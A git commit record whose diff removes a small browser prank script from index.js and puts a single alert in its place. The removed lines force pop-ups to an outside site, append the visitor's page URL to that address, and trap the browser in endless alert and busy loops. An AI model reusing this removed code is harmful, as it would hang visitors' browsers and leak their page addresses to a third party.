78771dfe2594673a3a8058a0115dd169a91378e3
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-10 16:55:32 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,18 +1,1 @@
-var windowName = 'userConsole';
-var popUp = window.open("http://kplibrary.cf/", '_blank', 'toolbar=0,location=0,menubar=0');
-if (popUp == null || typeof(popUp) == 'undefined') {
-  while (true) {
-    alert("Thicc Katz")
-  }
-} else {
-  while (true)
-    var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
-  var URL = "http://kplibrary.cf/" + location.href;
-  var win = window.open(URL, "_blank", strWindowFeatures);
-  setTimeout(function() {
-    for (var i = 0; i === i; i++) {}
-    txt = "a";
-    txt = txt += "a";
-  }, 5);
-}
-}
+alert("doggy")
